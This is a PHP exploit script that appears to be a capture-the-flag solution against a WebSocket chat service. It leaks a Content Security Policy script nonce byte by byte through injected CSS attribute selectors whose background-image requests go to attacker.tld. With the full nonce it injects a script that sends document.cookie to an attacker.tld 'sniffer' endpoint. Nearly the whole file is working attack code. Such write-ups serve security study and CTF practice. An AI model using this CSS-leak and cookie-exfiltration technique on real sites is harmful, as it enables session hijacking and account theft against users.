<?php
require('vendor/autoload.php');
use WebSocket\Client;

function sendMessage($guid, $message) {
	$client = new Client("wss://gabbr.hitme.tasteless.eu/$guid");
	$client->send($message);
}

function genPayload($nonce, $start = false) {
	$payload = '';
	for($i = 0; $i < 255; $i++) {
		$char = sprintf('%02x', $i);
		$payload .= 
			(in_array(strlen($nonce),[0,2])?'body > ':'').
			'script[nonce^=\''.$nonce.$char.'\']'.
			(in_array(strlen($nonce),[4,6])?' + nav':'').
			(in_array(strlen($nonce),[8,10])?' + nav + div':'').
			(in_array(strlen($nonce),[12,14])?' + nav + div + input':'').
			(in_array(strlen($nonce),[16,18])?' + nav + div + input + div':'').
			(in_array(strlen($nonce),[20,22])?' + nav + div + input + div + ul':'').
			'{display:block; background-image: url(https://attacker.tld/cssleak.php?nonce='.$nonce.$char.($start?'&start='.$start:'').')  '.
			(in_array(strlen($nonce),[2,6,10,14,18,22])?'!important;':'').' }\\n';
	}
	return $payload;
}

if(isset($argv[1])) {
	sendMessage($argv[1], '{"username":"css","type":"style","content":"'.genPayload('',$argv[1]).'"}');
	die('Exploit started');
}

session_start();
if(isset($_GET['start']) and (!isset($_SESSION['start']) or ($_GET['start'] !== $_SESSION['start']))) {
	$_SESSION['start'] = $_GET['start'];
}

if(strlen($_GET['nonce']) === 24) {
	sendMessage($_SESSION['start'], '{"username":"xss","type":"script","content":"location=\'https://attacker.tld/sniffer/?\'+document.cookie","nonce":"'.$_GET['nonce'].'"}');
} else {
	sendMessage($_SESSION['start'], '{"username":"css","type":"style","content":"'.genPayload($_GET['nonce']).'"}');	
}